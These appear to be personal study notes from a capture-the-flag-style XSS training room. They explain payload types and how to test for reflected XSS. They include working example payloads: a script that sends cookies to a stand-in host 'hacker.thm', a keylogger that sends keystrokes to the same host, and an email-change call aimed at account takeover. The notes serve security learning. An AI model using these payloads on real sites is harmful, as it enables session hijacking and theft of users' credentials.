--- ---

<h4>What is XSS</h4>

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

- What is a payload?

	In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

	The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

	Here are some examples of XSS intentions.

- Proof Of Concept:

	This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

	`<script>alert('XSS');</script>`

- Session Stealing:

	Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

	`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

- Key Logger:

	The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

	`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

- Business Logic:

	This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

	`<script>user.changeEmail('attacker@hacker.thm');</script>`

	Now that the email address for the account has changed, the attacker may perform a reset password attack.

--- ---

<h4>Reflected XSS</h4>

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

- **Potential Impact:**  
  
	The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

- **How to test for Reflected XSS:**  

	You'll need to test every possible point of entry; these include:

	-   `Parameters in the URL Query String`
	-   `URL File Path`
	-   `Sometimes HTTP Headers (although unlikely exploitable in practice)`
	-   `Title name of a website post` ---> 
		- example
			![[Pasted image 20221129102249.png]] 

   
	Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected
--- ---
